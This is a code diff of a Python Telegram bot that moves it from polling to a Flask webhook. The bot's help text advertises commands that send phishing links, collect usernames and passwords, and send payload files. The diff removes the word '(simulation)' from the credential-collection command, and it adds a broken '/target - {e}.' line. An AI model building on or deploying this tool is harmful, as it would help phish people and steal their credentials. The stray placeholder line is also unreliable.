@@ -13,6 +13,8 @@ API_HASH = os.getenv("API_HASH")  # Telegram API Hash
 # Initialize the Telegram bot
 bot = telebot.TeleBot(BOT_TOKEN)
 
+WEBHOOK_URL = os.getenv("WEBHOOK_URL")
+
 # Initialize Telethon client
 client = TelegramClient('session_name', API_ID, API_HASH)
 
@@ -28,9 +30,10 @@ def send_help(message):
         "📖 *Available Commands:*\n\n"
         "/start or /hello - Welcome message to get started.\n"
         "/phish - Sends a phishing link .\n"
-        "/credentials - Collects username and password (simulation).\n"
+        "/credentials - Collects username and password.\n"
         "/payload - Generates and sends a secure payload file (for authorized users only).\n"
         "/help - Displays this help message.\n\n"
+        "/target - {e}.\n"
         "💡 *Additional Features:*\n"
         "- All messages are logged for review.\n"
         "- Responses are securely forwarded to the admin.\n"
@@ -151,6 +154,17 @@ from flask import Flask
 
 app = Flask(__name__)
 
+@app.route(f"/{BOT_TOKEN}", methods=["POST"])
+def receive_update():
+    json_update = request.get_json()
+    bot.process_new_updates([telebot.types.Update.de_json(json_update)])
+    return "!", 200
+
+# Set webhook for Telegram bot
+def set_webhook():
+    bot.remove_webhook()
+    bot.set_webhook(url=f"{WEBHOOK_URL}/{BOT_TOKEN}")
+
 @app.route('/')
 def home():
     return "Bot is running!"
@@ -158,21 +172,13 @@ def home():
 def run_flask():
     port = int(os.environ.get("PORT", 5000))  # Default to 5000 if no PORT is set
     app.run(host="0.0.0.0", port=port)
-
-def run_telegram_bot():
-    print("Starting Telegram bot...")
-    bot.infinity_polling()
-
+    
 # Run both Flask and Telegram bot
 if __name__ == "__main__":
+    # Set webhook before starting Flask
+    set_webhook()
+
     flask_thread = threading.Thread(target=run_flask)
-    telegram_thread = threading.Thread(target=run_telegram_bot)
-
     flask_thread.start()
-    telegram_thread.start()
-
-    flask_thread.join()
-    telegram_thread.join()
-
 
 
